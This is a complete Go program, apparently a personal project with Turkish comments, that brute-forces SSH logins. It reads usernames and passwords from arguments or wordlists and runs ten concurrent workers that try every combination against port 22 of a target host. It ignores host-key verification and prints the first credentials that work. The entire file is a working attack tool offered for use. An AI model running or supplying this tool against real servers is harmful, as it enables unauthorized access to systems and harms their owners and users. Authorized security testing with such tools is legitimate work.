package main

import (
	"bufio"
	"fmt"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	inputParse()
}

func inputParse() {
	var password, passwordList, username, usernameList, hostname string

	args := os.Args[1:]

	if len(args) == 0 {
		fmt.Println("\nUsage: go run bruteForceSSH.go [OPTIONS]\n\nOPTIONS:\n-p [value]: Password\n-P [value]: Password List\n-u [value]: Username\n-U [value]: Username List\n-h [value]: Target")
		os.Exit(0)
	}

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-u":
			i++
			username = args[i]
		case "-U":
			i++
			usernameList = args[i]
		case "-p":
			i++
			password = args[i]
		case "-P":
			i++
			passwordList = args[i]
		case "-h":
			i++
			hostname = args[i]
		default:
			fmt.Println("Undefined Arguments:", args[i])
			os.Exit(0)
		}
	}

	if (password == "" && passwordList == "") || (username == "" && usernameList == "") || hostname == "" {
		fmt.Println("\nMissing Argument")
		fmt.Println("\nUsage: go run bruteForceSSH.go [OPTIONS]\n\nOPTIONS:\n-p [value]: Password\n-P [value]: Password List\n-u [value]: Username\n-U [value]: Username List\n-h [value]: Target")
		os.Exit(0)
	}

	fmt.Println("\nTarget:", hostname)

	var usernames []string // Tek kullanıcı adı girildiyse onu alır, liste girilirse de listeyi okuyup diziye atar.
	if username != "" {
		usernames = append(usernames, username)
	} else {
		usernames, _ = readFile(usernameList)
	}

	var passwords []string // Tek şifre girildiyse onu alır, liste girilirse de listeyi okuyup diziye atar.
	if password != "" {
		passwords = append(passwords, password)
	} else {
		passwords, _ = readFile(passwordList)
	}

	runSSHBruteForce(hostname, usernames, passwords)
}

func readFile(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return lines, nil
}

func trySSH(hostname, username, password string) bool { // SSH bağlantı yapılandırması burada gerçekleşiyor.
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         3 * time.Second, // SSH bağlantısı için 3 saniye zaman aşımı süresi.
	}

	_, err := ssh.Dial("tcp", hostname+":22", config) // SSH bağlantısı başlatılır.
	return err == nil
}

func worker(id int, jobs <-chan [2]string, results chan<- string, hostname string, wg *sync.WaitGroup) {
	defer wg.Done()

	for job := range jobs {
		username := job[0] // Kullanıcı adı atanır.
		password := job[1] // Parola atanır.
		fmt.Printf("Worker %d: Trying %s:%s\n", id, username, password)

		if trySSH(hostname, username, password) { // SSH bağlantısı için yazdığımız fonksiyonu çağırır.
			results <- fmt.Sprintf("Success! Username: %s, Password: %s", username, password)
			return
		}
	}
}

func runSSHBruteForce(hostname string, usernames, passwords []string) {
	numWorkers := 10 // Aynı anda çalışacak 10 işçi tanımlanıyor.

	jobs := make(chan [2]string, len(usernames)*len(passwords)) // Görevler için kanal oluşturulur.
	results := make(chan string, 1)                             // Başarılı sonucu almak için kanal oluşturulur.

	var wg sync.WaitGroup // Worker'ların bitmesini beklemek için WaitGroup oluşturulur.

	for i := 1; i <= numWorkers; i++ { // İşçi sayısı kadar worker başlatılır.
		wg.Add(1)
		go worker(i, jobs, results, hostname, &wg)
	}

	// Kullanıcı adı ve parola kombinasyonlarını jobs kanalına gönder.
	go func() {
		for _, user := range usernames {
			for _, pass := range passwords {
				jobs <- [2]string{user, pass} // Her kombinasyon `jobs` kanalına gönderilir.
			}
		}
		close(jobs) // Tüm görevler gönderildiğinde kanal kapatılır.
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	for result := range results {
		fmt.Println(result)
		os.Exit(0)
	}

	fmt.Println("Brute force attempt finished.")
}
